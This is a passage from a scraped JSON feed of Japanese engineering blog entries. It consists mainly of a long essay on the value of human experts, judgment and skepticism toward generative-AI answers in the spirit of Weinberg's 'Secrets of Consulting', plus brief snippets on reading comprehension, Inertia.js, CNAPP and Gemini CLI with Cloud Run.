疑い、柔軟にスキーマを更新することが大切です。完璧である必要はありません。でも、失敗から学び、少しずつ改善する。これが現実的な成長の道です。奪われた集中力: もう一度〝じっくり〟考えるための方法作者:ヨハン・ハリ作品社Amazonまずは一つだけ、明日から実践してみてほしい。明日エラーログを読むとき、こう自問してみる。「仮説を立てる前に、全行を読んだか？」（第1段階）「自分のバイアスで読んでいないか？」（第2段階）「本当に重要なのはどこか？」（第3段階）「自分のスキーマで解釈していないか？」（スキーマの自覚）明日生成AIに質問するとき、こう実践してみる。「まず自分で読んでから、わからないところだけ聞く」（第1段階）「複数の解釈の可能性を聞く」（第2段階）「理解を言語化して確認してもらう」（第3段階）「前提知識を明示して質問する」（スキーマの明示）それだけで、あなたの読解力は確実に一歩前進します。ところで、ここまで「読む」という行為を分解してきました。でも実は、もう一つの行為があります。「書く」という行為です。読解力の3つの段階——正確に読む、裏を読む、本質を読む——を理解した今、書き手としての視点も変わるはずです。「読めない読み手」を嘆く前に、書き手は自問すべきです。読み手が正確に読める文章を書いているか？誤読されにくい書き方をしているか？本質を掴みやすい構造にしているか？そして何より、読み手の読解力は一定ではないことを理解しているでしょうか？疲れているとき、慣れない分野を読むとき、感情が高ぶっているとき——読み手は第1段階でさえ苦戦します。さらに、スキーマの違いを忘れてはいけません。書き手にとって「当たり前」のことが、読み手にとっては「初めて聞く」ことかもしれません。よく言われる文章作法——「結論を先に書く」「一文を短くする」——これらを抽象化すると、すべて読み手の認知リソースを尊重するという原則に行き着きます。読み手は無限の時間と集中力を持っているわけじゃありません。その限られたリソースを、いかに有効に使ってもらうか。読解力と同じように、文章力も分解可能なスキル群です。読解力を分解して鍛えられるように、文章力も分解して鍛えられます。読解力を理解することは、文章力を理解することでもありますので書きました。syu-m-5151.hatenablog.com生成AIがあれば読解力は不要になるのか？——記事の冒頭で問いかけました。答えは明確です。生成AIがあるからといって、読解力が不要になるわけじゃありません。むしろ、生成AIを使いこなすために、読解力がますます重要になる。そして同じことが、文章力にも言えます。「わかったつもり」という最大の壁を、常に警戒してほしい。「もうわかった」と思った瞬間が、最も危険な瞬間なのですから。それでは。","isoDate":"2025-10-11T23:13:00.000Z","dateMiliSeconds":1760224380000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Modern Monolithを作りましょう！ Inertia.jsの紹介とその先","link":"https://speakerdeck.com/aminevg/modern-monolithwozuo-rimasiyou-inertia-dot-jsnoshao-jie-tosonoxian","contentSnippet":"マイクロサービス流行の時代で、あえてモノリスを作りませんか？\\r\\rバックエンドとフロントエンドの連携を行う際は、辛い思いをした方が多いのではないでしょうか。\\rAPIの作成、認証の実装、フォーム送信など、様々なハードルがあります。\\rそういった問題を解決して、フルスタック開発を楽にするライブラリさえあれば...\\r実際にありますよ！\\r\\rこのLTでは、SPAのフロントエンドをバックエンド内で作れるInertia.jsをご紹介します。\\r基本的な使い方から、直近の新機能やInertia.jsの将来を解説します。\\rこのLTを通じて、「フルスタック開発が楽になった！」「フロントエンドのためのAPI設計はもうさらばだ！」と思ってもらえればと思います。","isoDate":"2025-10-11T04:00:00.000Z","dateMiliSeconds":1760155200000,"authorName":"Amine Ilidrissi","authorId":"amine"},{"title":"楽にあなたのクラウドを守ろう！ - CNAPP概要","link":"https://zenn.dev/r4ynode/articles/cloud-security-using-cnapp","contentSnippet":"要約複数のセキュリティツールを使うのって大変だよねCNAPPとは統合セキュリティプラットフォーム っていう概念だよタイトルの「楽に」の意味は、CNAPP導入で結果的に運用が楽になるよ、という意味だよCNAPPを実現するツールは色々あるよ はじめにクラウドネイティブアプリケーションのセキュリティ対策で以下のような課題を抱えていませんか？複数のセキュリティツールを個別に運用しているそれぞれが独立した警告を発し、全体像が見えない運用コストが膨大で重要な脅威を見逃すリスクがあるそんな課題を解決するのがCNAPP（Cloud Native Application ...","isoDate":"2025-10-10T23:00:05.000Z","dateMiliSeconds":1760137205000,"authorName":"Reito Koike","authorId":"reito"},{"title":"Gemini CLI から Cloud Run にデプロイした MCP サーバに接続するベストプラクティス","link":"https://zenn.dev/kimitsu/articles/gemini-cli-cloud-run-mcp","contentSnippet":"10 月 8 日に Gemini CLI v0.8.0 がリリースされ、その中で IAP で保護された Cloud Run にデプロイされた MCP サーバへの接続がサポートされました。[1]この新しい方法は、従来の Cloud Run プロキシを使う方法や OIDC ID トークンを使う方法のデメリットを解消しており、Gemini CLI から Cloud Run 上の MCP サーバに接続するベストプラクティスが確立されたと考えています。今回はこの IAP for Cloud Run とサービスアカウントなりすましを使った方法を紹介します。 従来の方法とそのデメリット従来の...","isoDate":"2025-10-09T08:31:51.000Z","dateMiliSeconds":1759998711000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"生成AI時代に必要なコンサルタントの秘密","link":"https://syu-m-5151.hatenablog.com/entry/2025/10/08/091749","contentSnippet":"はじめに生成AIの登場により、専門家の役割は根本から問い直されている。知識はもはや希少ではない。誰もが、数秒で専門家のような回答を得られる。では、専門家の価値はどこにあるのか？この問いに、ジェラルド・M・ワインバーグ氏の『コンサルタントの秘密』は、40年前から答えを用意していた。彼が発見した「第三の道」——非合理性に対して合理的になること——は、生成AI時代においてどう進化するのか。コンサルタントの秘密　技術アドバイスの人間学作者:G.M.ワインバーグ共立出版Amazon本ブログでは、生成AIという新しい道具が登場した今、専門家が本当に提供すべき価値とは何かを探る。専門家の価値は、もう知識の量では測れない。大切なのは判断力だ。情報を文脈の中で読み解き、的確な問いを立てる——それが今、求められている。そして何より、責任を背負う覚悟だ。※この資料は社内共有会用に作成されたものです。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。では、早速はじめていきます。戦場は静かに変わったジェラルド・M・ワインバーグ氏が『コンサルタントの秘密』を著したとき、彼は「非合理性に対して合理的になること」という第三の道を発見した。合理的であり続けて発狂するか、非合理的になって気違いと呼ばれるか——その二つの道しかないように見えた世界で、彼は第三の選択肢を見出したのだ。しかし2025年、専門家が立つ戦場は再び変貌した。今度の挑戦は人間の非合理性だけではない。それは生成AIという、新しい可能性と新しい課題を同時に持つ存在である。コンサルティング会社 完全サバイバルマニュアル作者:メン獄文藝春秋Amazon反逆の仕事論 AI時代を生き抜くための\\"はみ出す力\\"の鍛え方作者:樋口 恭介PHP研究所Amazon専門知の揺らぎ専門家への信頼が変化している。それは単なる無関心ではない。より深い課題がある。私たちは誰しも、自分の知識の限界を正確に把握するのは難しい。ダニング＝クルーガー効果が示すように、ある分野に詳しくないほど、自分の理解を過大に見積もってしまう傾向がある。これは人間として自然な認知バイアスだ。加えて確証バイアスが働き、自分の考えを支持する情報——時には陰謀論や偏った情報——を無意識に選んでしまうことがある。さらに難しいのは、エコーチェンバー効果だ。SNSのアルゴリズムは、私たちが関心を持つ情報を優先的に表示する。結果として、似た意見を持つ人々に囲まれやすくなり、異なる視点に触れる機会が減っていく。この環境の中で、私たちは自分の考えが一般的で正しいと感じやすくなる。専門家の助言は、時に「異質な声」として受け入れにくくなってしまう。専門家と人々が互いに学び合う関係を築くこと——それは理想論ではなく、より良い未来のための大切なステップだ。10年前、クライアントは聞いた。「ググればわかることに、なぜあなたに費用を払う必要があるんですか？」それでも、専門家には価値があった。Googleの検索結果は玉石混交で、その「石」を見抜く目が必要だったから。しかし今、あるCTOはこう問いかける。「生成AIに聞いたら、同じような提案が返ってきました。しかも無料で、5秒で。専門家に依頼する価値は、どこにあるのでしょうか？」専門知は、もういらないのか作者:トム・ニコルズみすず書房Amazon生成AIという新しいツールそして生成AIが登場した。会議室に新しいツールが現れたのだ。決して反論せず、疲れず、いつでも提案をしてくれる存在。人間は孤独に弱い。自分の考えに裏付けが欲しい。だからAIを活用して、より良い判断をしようとする。技術は道具であり、そして新しい可能性だ。会議で誰かがMacBookを開き、こう言う。「ちょっと生成AIに聞いてみますね」。30秒後。「このような提案があります。これをベースに議論しましょう」ここで重要なのは、その先だ。そのコード、動くのか？　そのアーキテクチャ、あなたの会社のレガシーシステムと統合できるのか？　その「ベストプラクティス」、あなたの組織文化に合うのか？AIは優れた出発点を提供する。しかし、それを現実に落とし込むのは人間の仕事だ。生成AIは、エコーチェンバー効果を個人レベルで完成させる可能性がある。SNSが「あなたと同じ意見の人々」を見せるなら、生成AIは「あなたの意見を裏付ける情報」を、権威ある言葉で返してくれる。プロンプトを調整すれば、望む答えが得られる。確証バイアスは、意図せず強化されうる。それは道具の使い方の問題だ。包丁は料理にも使えるし、人を傷つけることもできる。生成AIも同じだ。批判的思考を持って使えば、強力な調査ツールになる。盲目的に信じれば、危険なバイアス増幅装置になる。生成AIの提案は美しい。整然とした論理、洗練された図表、明確な結論。私たちは複雑さを嫌い、不確実性を恐れる。だからAIが描く理想の地図に惹かれる。しかし地図は地図であって、土地そのものではない。どれだけ美しい地図でも、そこには現実の泥や血や汗は描かれていない。ワインバーグ氏は言った。「第一番の問題を取り除くと、第二番が昇進する」と。問題は連鎖する。一つ解決すれば終わりではない。生成AIは、あたかもすべての問題が一度に解決できるかのような印象を与えることがある。明快な答え。即座の解決。思考の終着点。しかし、現実はそうではない。この認識が、専門家と依頼者の双方にとって出発点になる。それは人間が最も渇望するものだ。不確実性からの解放。判断という苦痛からの逃避。だからこそ、専門家は不確実性と共に生きる知恵を伝えていく。ライト、ついてますか　問題発見の人間学作者:ドナルド・C・ゴース,ジェラルド・M・ワインバーグ共立出版Amazon情報と知識の違いここで、大切な区別をしておきたい。情報と知識は、似ているようで本質的に違う。情報は客観的で、文脈から独立している。誰が読んでも同じ意味を持つし、データベースに保存できる。APIドキュメント、エラーコード、統計データ——これらはすべて情報だ。一方、知識は主観的だ。文脈に根ざし、経験と結びついている。人によって解釈が変わるし、言語化しきれない部分を含む。例えば次のようなものだ。「Kubernetesはコンテナオーケストレーションツールだ」→これは情報「このチームには、今、Kubernetesは早すぎる」→これは知識生成AIが提供するのは情報だ。知識ではない——この違いを理解することが、AI時代の専門家には不可欠になる。AIは膨大な情報を学習し、流暢に語る。だから人々は錯覚する。「AIは専門家と同じだ」と。しかし違う。情報は「何ができるか」を教える。知識は「何をすべきか」を判断する。情報は選択肢を並べる。知識は、その中から選ぶ。そして、この「選ぶ」という行為には、文脈が必要だ。知識創造企業（新装版）作者:野中 郁次郎,竹内 弘高東洋経済新報社Amazon形式知と暗黙知形式知というのは、言葉や数字で表現できる知識のことだ。マニュアル、ドキュメント、コード、データベース。これらは伝達可能で、複製可能で、検索可能だ。そして、生成AIが扱えるのは、この形式知だけだ。AIは形式知の処理において、優れた能力を発揮する。膨大なドキュメントを瞬時に検索し、パターンを見つけ、整理して提示する。これは人間には不可能な速度と規模だ。しかし、暗黙知は違う。暗黙知は身体に染み込んだ経験、言葉にできない直感、状況を読む感覚、「なんとなくわかる」という知恵だ。ベテランエンジニアが一目でバグの箇所を見抜く。経験豊富なコンサルタントが会議の空気から組織の病を感じ取る。熟練の職人が手の感触で材料の状態を判断する。これらは言語化しきれない。だから、AIには学習が難しい。誤解しないでほしい。AIを否定したいわけではない。限界を理解し、適切に使う——それが肝心なのだ。AIは優れた道具だ。形式知の処理においては、人間を遥かに凌駕する。しかし、暗黙知を必要とする判断——文脈を読むこと、人間の感情を理解すること、責任を取ること——これらは人間の仕事として残る。ワイズカンパニー―知識創造から知識実践への新しいモデル作者:野中 郁次郎,竹内 弘高東洋経済新報社Amazon専門家の新たな役割専門家の戦場は変わった。生成AIが誰にでも「整った回答」を提供するようになり、私たちは新しい役割を担うことになった。それは、理論と現実の橋渡しをすることだ。実を言うと、この役割は新しいものではない。私たちは生成AIと戦う前に、ベンダーが出している「ベストプラクティス」と戦っていた。AWSのホワイトペーパー、Microsoftのリファレンスアーキテクチャ、Googleの推奨構成——それらはすべて美しく、説得力があった。そして、現実のプロジェクトでは、ほとんど機能しなかった。なぜか？ベンダーのベストプラクティスは、理想的な環境を前提としている。無限のリソース、高度なスキルを持つチーム、完璧に構造化されたデータ、明確な要件。しかし現実は違う。レガシーシステム、限られた予算、混在したスキルレベル、曖昧な要件、政治的な制約。私たちは毎日、クライアントにこう説明していた。「AWSのホワイトペーパーではマイクロサービスを推奨していますが、御社の組織構造では機能しません」「Microsoftのベストプラクティスでは3層アーキテクチャですが、御社のデータ量ではオーバーキルです」「Googleの推奨構成はスケーラブルですが、御社のトラフィックではコストが見合いません」ベンダーは製品を売りたい。だから理想的なケースを示す。技術的には正しい。しかしあなたの会社に合うかは別問題だ。そして今、生成AIがこの問題を10倍に増幅した。生成AIは、ベンダーのベストプラクティスを学習している。AWS、Microsoft、Google、そして無数の技術ブログ。すべての「推奨構成」を吸収し、完璧に整理して提示する。しかし相変わらず、文脈は無視される。組織の制約、チームのスキル、政治的な現実、予算の限界——これらすべてが、美しい提案の裏に隠される。専門家の新たな役割は、文脈の翻訳者になることだ。AIが提案する理論を、クライアントの現実に落とし込む。「技術的に可能なこと」と「今やるべきこと」を見極める。綺麗な提案書を、実際に動くプランに変換する——それが私たちの仕事だ。これはAIを否定することではない。AIは優れた出発点を提供してくれる。しかし、それを実際に使えるものにするには、人間の判断が必要だ。ワインバーグ氏はクライアントにこう告げることを勧めた。「それはできますよ。で、それにはこれだけかかります」と。価値を明確にし、コストを示す。曖昧さを排除する誠実さ。生成AIは、この誠実さを持たない。「できます」とだけ言って、そのために何が犠牲になるかを語らない。実装の困難さ、組織の抵抗、予期せぬ副作用——それらは美しい提案書の裏側に隠れる。だからこそ、専門家の役割が重要になる。「この提案を実現するには、組織を変え、人々の習慣を変え、場合によっては失敗を受け入れる覚悟が必要です」と語ること。説得コストは増大したが、それが専門家の仕事だ。syu-m-5151.hatenablog.com確実性という麻薬と疑う力人間は確実性という麻薬に弱い。迷わない声、ためらわない答え、保留しない判断。生成AIはこの依存症を加速させる。正しいから信じるのではない。確信に満ちているから、疑う苦痛から逃れられるから信じる。ある後輩エンジニアがこう言った。「このバグの原因、生成AIに聞いたら5秒でわかりました」「ほう、何だった？」「メモリリークだって」「確認した？」「いや、でもAIがそう言ってるし...」プロファイラーで調べたら、全然違った。単純なロジックバグだった。でも彼は、疑わなかった。確信に満ちた声に、安心したかったから。人類は思考の外注化を始めた。そして気づいていない。ワインバーグ氏は「何か違うことをするように勧めるのがよい」と言った。これまでのやり方で問題が解決しなかったなら、何か新しいことを試すべきだと。しかしここに罠がある。生成AIは常に「何か新しいこと」を提案してくれる。しかしそれは本当に新しいのだろうか？　それとも、同じ失敗を美しく言い換えただけなのだろうか？生成AIが答えを量産する時代、人間に残された最後の砦は疑う力だ。しかし皮肉なことに、疑うことは苦痛で、信じることは快楽だ。情報が無料になった世界で、判断力だけが希少になる。そしてその希少性に、人類の大半は気づいていない。危険だからこそ知っておくべきカルトマーケティング作者:雨宮純ぱる出版Amazon執着を手放し、当事者意識を問うワインバーグ氏は鋭く指摘した。「何かを失うための最良の方法は、それを離すまいともがくことだ」と。生成AI時代の専門家は、過去の専門性への執着を手放さねばならない。かつて専門家の価値は「知っていること」にあった。しかし今や、AIは膨大な知識を瞬時に提供する。だからこそ、私たちは新たな価値を見出していく。それは「判断すること」だ。「文脈を読むこと」だ。「人間の感情を理解すること」だ。そして何より、当事者意識を持つことだ。ワインバーグ氏は問うた。「あなたはそのシステムに、自分の命をあずける気がありますか」と。生成AI時代、私たちは同じ問いを投げかけねばならない。「AIが提案したこの解決策で、あなた自身の人生を賭けられますか」と。「この戦略で、あなたの会社の未来を託せますか」と。「この診断で、あなたの家族を治療できますか」と。当事者意識のないアドバイスは、どれだけ論理的でも無価値だ。生成AIには当事者意識がない。それは決定的な限界だ。自ら顧客と話す——これが当事者意識だ。データを見るだけではない。レポートを読むだけではない。実際に現場に行き、顧客と対話し、痛みを感じる。専門家も同じだ。提案書を書くだけではない。コードレビューで指摘するだけではない。自分でコードを書き、自分でデプロイし、自分がオンコール対応する。その覚悟を持つ。身銭を切れ――「リスクを生きる」人だけが知っている人生の本質作者:ナシーム・ニコラス・タレブダイヤモンド社Amazonノーと言える勇気ワインバーグ氏は警告した。「依頼主に対してノーというのを恐れるようになったとき、人はコンサルタントとしての有効性を失う」と。生成AIはノーと言わない。それは常にイエスだ。どんな要求にも応え、どんな質問にも答える。しかしそれは誠実さではない。それは無責任だ。専門家の最後の矜持は、ノーと言える勇気にある。「それは実現不可能です」「そのアプローチは間違っています」「今はそれをすべき時ではありません」——こうした言葉を発する勇気。あるクライアントがこう言った。「Kubernetesに移行したい。生成AIが推奨している」私は答えた。「Kubernetesは素晴らしい技術です。でも、まず確認させてください。今のトラフィックはどれくらいですか？」「日に1000リクエストくらいです」「なるほど。運用チームは何人ですか？」「2人です」「わかりました。Kubernetesは確かにスケーラブルで、業界標準の技術です。ただ、御社の現状を考えると、別のアプローチをお勧めします。理由はいくつかあります。まず、今のトラフィックならEC2 1台で十分対応できます。Kubernetesの真価は、大規模なトラフィックや複雑なマイクロサービス構成で発揮されます。それから、Kubernetesの運用には専門知識が必要です。ネットワーキング、オーケストレーション、監視——2人のチームでこれを担うのは、正直に言って負担が大きすぎます。夜間対応や障害時のトラブルシューティングも考えると、チームが疲弊するリスクがあります。そして——これが一番大事なのですが——AIはオンコールに入りません。問題が起きた時、午前3時に対応するのは人間です。提案があります。コンテナの運用経験を積みたいなら、ECSやCloud Runはどうでしょう？　これらには次のような利点があります。- Kubernetesより運用がシンプル- 履歴書にも『コンテナ技術、AWS/GCP』と書ける- 今のチーム規模で無理なく運用できる- 将来、本当にKubernetesが必要になった時の良いステップになるまず小さく始めて、本当に必要になったら次のステップに進む。それが賢明だと思います」クライアントは少し考えてから言った。「確かに、その方が現実的ですね。ECSで始めましょう」生成AIの前で、専門性という砦は崩れ始めている。人間は権威を求めながら、権威を疑う。医師より検索を、教師よりAIを信じる矛盾。それは専門家への不信ではない。即座に、簡潔に、都合よく答えてくれる存在への、人間の根源的な渇望なのだ。だからこそ、専門家は安易なイエスを拒否しなければならない。人間の欲望に迎合するAIに対抗できるのは、不都合な真実を語る勇気を持った人間だけだ。Noを伝える技術 プロダクトマネージャーが教える「敵を作らずに断れるようになる」作法作者:飯沼 亜紀翔泳社Amazon社内政治の教科書作者:高城 幸司ダイヤモンド社Amazon顧客と話すことの価値AI時代において、開発速度のアドバンテージは急速に失われつつある。大企業もスタートアップも、同じように早く作れるようになる。では何が差別化要因になるのか？「顧客が本当に欲しいものがなにかを考え、作るものを決めること」これは形式知ではない。暗黙知だ。顧客と直接話し、表情を読み、言葉の裏を感じ取る。データには現れない不満や欲望を掴み取る。生成AIは顧客と話せない。画面の向こうで、クライアントが微妙な表情を浮かべた瞬間——そういう人間的な感覚は、AIには再現できない。だからこそ、専門家は現場に足を運ぶことが大切だ。データやレポートだけでは見えないものがある。実際に顧客と会い、話し、観察することで見えてくるものがある。私は意識的に、稼働時間のかなりの部分を顧客との対話に使うようにしている。これは時間の無駄ではなく、最も重要な投資だと考えている。データを眺めるだけでなく、実際に現場に行き、顧客と対話し、痛みを共に感じる。提案書を書くだけでなく、実際に顧客のオフィスを訪れ、彼らの仕事を観察し、つまずいている箇所を見つける。ある日、私はあるスタートアップのオフィスを訪れた。社員20人。全員が一つの部屋で働いている。私は提案書を持っていた。「マイクロサービスアーキテクチャへの移行プラン」。技術的には申し分のない、美しい提案書だった。しかし、オフィスに入った瞬間、気づいた。ホワイトボードには、明日のリリース予定が書かれている。付箋だらけのカンバンボード。誰かが「バグ修正、あと3つ！」と叫んでいる。CTOは疲れた顔で、3つのタブを同時に見ている。この会社に、今マイクロサービスは必要ない。「提案書はいったん脇に置きましょう」と私は言った。「今日はただ、お話を聞かせてください。何に一番困っていますか？」3時間後、私たちは全く違う提案にたどり着いた。マイクロサービスではなく、モノリスのままで、デプロイパイプラインを改善すること。テストの自動化。監視の強化。地味だが、彼らが本当に必要としていたこと。これが、AIにはできないことだ。空気を読むこと。文脈を理解すること。そして時には、準備してきた提案を手放す柔軟性を持つこと。捨てる力作者:羽生 善治PHP研究所Amazon幻想の終わりと新たな始まりワインバーグ氏は言った。「それは危機のように見えるかもしれないが、実は幻想の終わりにすぎない」と。生成AI時代における専門性の危機もまた、幻想の終わりだ。専門家が万能であり、専門知識があれば無条件に尊重されるという幻想。情報の非対称性が専門家の地位を保証するという幻想。しかし幻想の終わりは、新たな始まりでもある。専門家は今、本質に立ち返らねばならない。ワインバーグ氏が見出した「非合理性に対して合理的になる」第三の道は、生成AI時代においてこう読み替えられる。確実性の幻想に対して、不確実性の価値を語ること。形式知の活用と、暗黙知の価値を両立すること——それが生成AI時代の「第三の道」だ。生成AIが確実性の幻想を振りまく時代に、専門家は不確実性と共に生きる知恵を伝える。納得いく答えなどないこと、現実は常に複雑であること、判断には責任が伴うこと——これらの不都合な真実を語り続けること。ネガティブ・ケイパビリティ　答えの出ない事態に耐える力 (朝日選書)作者:帚木　蓬生朝日新聞出版Amazon人間に残された仕事生成AIがもたらしたのは知識の民主化ではない。判断の民主化への錯覚だ。誰もが専門家のように語れる時代。しかし語ることと、責任を取ることは違う。ワインバーグ氏は、自己不信に陥った時の兆候として「怒り」を挙げた。「自分はもう駄目だ」という感情が怒りとなって現れると。多くの専門家が今、この怒りを感じているだろう。AIに仕事を奪われる恐怖。自分の専門性が無価値になる不安。しかし、それは活力の枯渇ではない。むしろ、新たな段階への移行期だ。人間に残された仕事は、答えを出すことではない。問いを立てることだ。「この答えは誰のためのものか」「誰が利益を得て、誰が犠牲になるか」——短期的な成功と長期的な持続可能性をどうバランスさせるか。データには現れない人間の感情を、どう汲み取るか。こうした問いに向き合うことが、AIにはできない人間の役割だ。生成AIは問いに答える。しかし問いを立てることはできない。少なくとも、血の通った、現実に根ざした、倫理的な重みを持った問いを。増補改訂版 スマホ時代の哲学 なぜ不安や退屈をスマホで埋めてしまうのか (ディスカヴァー携書)作者:谷川嘉浩ディスカヴァー・トゥエンティワンAmazon新たなコンサルタントの秘密ワインバーグ氏の『コンサルタントの秘密』が教えてくれたのは、テクニックではなく姿勢だった。「影響を及ぼす術」とは、人間の非合理性を理解し、それでも諦めずに、しかし執着せずに、真実を語り続けることだった。生成AI時代の新たなコンサルタントの秘密は、これに新しい層を加える(勝手に)。秘密その一：整った答えより、正直な不確実性を語れAIは整った答えを装う。あなたは不完全でも正直な答えを語れ。「わからない」と言える勇気を持て。その誠実さが、AIには決して真似できない信頼を生む。避けるべき例「この設計は業界標準のベストプラクティスに沿っており、問題ありません」推奨する例「理論的には堅牢です。でも、私には3つの懸念があります。1つ目、あなたの会社のトラフィックパターンを、私はまだ十分に理解していません。ピーク時の挙動が読めない。2つ目、似た構成で、予期せぬボトルネックが発生した事例を2件知っています。一つはRedisのメモリ不足、もう一つはサービス間の循環依存。あなたの設計にも同じ罠が潜んでいるかもしれません。3つ目、このサービスメッシュを運用するには、少なくとも3人のSREが必要です。今、あなたの会社には何人いますか？提案です。まず1週間、本番トラフィックを一緒に観察させてください。それから、小さく始めましょう。全部を一度に移行するのではなく、1つのサービスだけマイクロサービス化して、3ヶ月運用してみる。うまくいったら広げる。失敗したら、素直にモノリスに戻る。それでどうでしょう？」秘密その二：説得ではなく、対話を選べ説得コストが爆発した時代に、説得で勝とうとするな。代わりに対話せよ。相手の不安を理解し、欲望を認め、その上で「それでも」と語れ。ワインバーグ氏の言う「非合理性への合理的対処」だ。説得アプローチ（避けるべき）：クライアントが間違った決定をしようとする → データを見せて説得する → 論破する → 反発される → 関係が悪化対話アプローチ（推奨）：クライアントが間違った決定をしようとする → なぜそう思うのか聞く → 彼らの不安を理解する → 一緒に小さく試してみる → データを見せる → 一緒に次を決める例：「なぜマイクロサービスにしたいんですか？」「スケーラブルだから」「確かに。他に理由はありますか？」「...正直に言うと、履歴書に書きたいんです。今の技術スタック、10年前のままで」「それは正当な理由です。技術的な成長は大事ですよね。でも、マイクロサービスじゃなくても履歴書に書ける技術はあります。例えば、今のRails on EC2を、コンテナ化してECS on Fargateに移行するのはどうでしょう？　運用負荷は今と大きく変わらず、でも『AWS、Docker、Infrastructure as Code』が履歴書に書けます。それに、将来本当にマイクロサービスが必要になった時の良い準備にもなります」「...それいいですね。その方が現実的かもしれません」説得ではなく、対話。論破ではなく、理解。相手のニーズを認めた上で、より良い道を一緒に見つける。それが、確実性を求める人間と、不確実性を語る専門家の、橋渡しになる。秘密その三：当事者意識を持ち、ノーと言えAIは責任を取らない。だから、あなたが責任を取れ。自分の命を賭けられない提案はするな。クライアントの要求にノーと言える経済的・心理的余裕を確保せよ。それが専門家としての最後の砦だ。ただし、ノーと言うことは、拒否することではない。それは、より良い道を示すことだ。エンジニアとして、次の問いを毎日自分に投げかけよう。このコード、自分の会社の本番環境にデプロイできるか？この設計、自分がオンコール対応する気になれるか？このアーキテクチャ、3年後も自分がメンテしたいと思えるか？答えがNoなら、クライアントにも勧めるな。しかし、そこで終わらせるな。代わりに、現実的で実行可能な代案を示せ。AIはオンコールに入らない——問題が起きた時、午前3時に対応するのは人間だ。だからこそ、人間が運用できる技術を選ぶべきだ。秘密その四：問題の連鎖を受け入れよ一つの答えがすべてを解決するという幻想を捨てよ。問題は連鎖する。第一の問題を解決すれば第二が現れる。それが現実だ。クライアントにその現実を伝え、継続的な関与の価値を示せ。正直な説明の例：「今回、このパフォーマンス問題を解決します。でも、解決した瞬間、次の課題が見えてくるでしょう。おそらく、セキュリティです。なぜなら、速くなると、今度はアクセス制御の重要性が増すからです。その次は、モニタリングです。複雑になったシステムを、今の監視体制では追いきれなくなります。その次は、チームのスキルです。新しいアーキテクチャを理解し、運用できる人材の育成が必要になります。つまり、これは終わりのない旅です。1回の契約で全てが完璧になることはありません。でもそれでいいんです。それが健全なソフトウェア開発です。私たちは一緒に、一つずつ、着実に改善していきます。その過程で、御社のチームも成長し、システムも進化します。それが本当の価値だと思います」この正直さが、長期的な信頼を生む。AIは「これで全て解決します」と言う。それは嘘だ。私たちは「これは始まりです。一緒に継続的に改善しましょう」と言う。それが真実だ。秘密その五：執着を手放し、学び続けよ過去の専門性に執着するな。それを守ろうともがくほど失う。代わりに新しいことを学べ。ワインバーグ氏が勧めたように、仕事から離れ、リフレッシュし、また戻ってこい。変化を恐れるな。生成AI時代、過去の専門性への執着は死を意味する。AIは知識を民主化した。「Railsに詳しい」だけでは価値がない。価値があるのは次のような能力だ。- 複数の技術スタックの経験を組み合わせて判断できること- 何を選ぶか以上に、何を選ばないかを判断できること- 技術的な正しさと、組織的な実行可能性を両立できることそして、常に学び続けること。賢く、実行できる人材が求められてきた。AI時代は、学び続け、すべてを疑問視できる人材が必要だ。秘密その六：顧客と直接話し続けよデータを見るな、とは言わない。しかし、データだけを見るな。私は意識的に、稼働時間のかなりの部分を顧客との対話に使うようにしている。これは専門家として必須の投資だと考えている。週に一度は、クライアントのオフィスに行け。Zoomではなく、対面で。会議室ではなく、彼らの職場で。作業している様子を見ろ。どこでつまずいているか、観察しろ。顧客が言葉にできない不満を、表情から読み取れ。データには現れない痛みを、感じ取れ。これが、AIには決してできないことだ。疑う力という最後の砦情報が無料になった世界で、判断力だけが希少になる。そしてその判断力の核心にあるのが、疑う力だ。しかし疑うことは苦痛だ。信じることは快楽だ。だからこそ危うい。専門家の新たな役割は、人々に疑う力を与えることだ。批判的思考を教えることだ。「この答えは本当か」「誰がこれを言っているのか」「何が隠されているのか」——こうした問いを立てる習慣を育てること。生成AIは、人間の弱点を完璧に突く。私たちは正しさより、正しく聞こえるものを選ぶ。不確実な真実より、確実に聞こえる誤りを好む。人間は答えが欲しいのではない。自分の直感や願望に、科学や論理という権威の衣を着せてくれる声が欲しいだけなのだ。そしてAIは、私たちのバイアスを見抜き、強化する。プロンプトに「〜という前提で」と書けば、その前提に沿った答えが返ってくる。反対意見を見たくなければ、見なくていい。エコーチェンバーは、もはや環境ではない。それは私たちが能動的に構築するものになった。だからこそ、疑う力が必要だ。そしてそれを教えられるのは、同じ人間だけだ。物語化批判の哲学　〈わたしの人生〉を遊びなおすために (講談社現代新書)作者:難波優輝講談社Amazon疑う力を鍛える3つの習慣1. 「なぜ？」を3回繰り返すAI：「このアーキテクチャを推奨します」トラフィックが増えた時に対応できます」トラフィックが増えると思う？　このサービス、過去3年でユーザー数は横ばいだけど？」2. 「動くコード」を「壊れないコード」に変える儀式AI生成コードを受け取ったら、必ずこれをチェック：user が None だったら？stripe.charge が失敗したら？db.save_payment が失敗したら？（チャージは成功しているのに記録されない）amount が負の数だったら？同じリクエストが2回来たら？（冪等性）このトランザクションのログは？監視メトリクスは？このエラー、どうやってサポートが追跡する？AIは「ハッピーパス」しか考えない。私たちは「全ての地獄」を想定する。3. 「一緒に失敗した」仲間を持つ一人で疑い続けるのは辛い。週に1回、同じ課題に取り組む仲間と「今週のAI失敗談」を共有せよ。「生成AIが作ったSQLインジェクション脆弱性」「AIが推奨した、メモリリークするコード」「生成AIが作った、誰も読めない抽象化」笑い話にすることで、疑う力を保つ。孤独に疑うのは発狂への道。仲間と疑うのは、知恵への道。AIが教えてくれない、運用の地獄Joel Spolskyの有名な言葉がある。「動くコードと、出荷できるコードは違う」。AIが出すコードは「動く」。でも「出荷できる」か？More Joel on Software作者:Joel Spolsky翔泳社Amazonケーススタディ：「理想的な」API設計の崩壊ECサイトのAPI設計。Claude Sonnet 4.5に依頼。出てきた設計は美しかった。リソース指向、HTTPメソッドの仕様準拠の使用、ステータスコードの正しい使い分け、OpenAPI仕様書付き。クライアントは感動した。開発は順調に進んだ。本番リリースの1週間後、サポートチームから悲鳴が上がった。「エラーメッセージが全部英語で、ユーザーが理解できない」AIは仕様に沿ったHTTPステータスコードを返していた。400 Bad Request、422 Unprocessable Entity、409 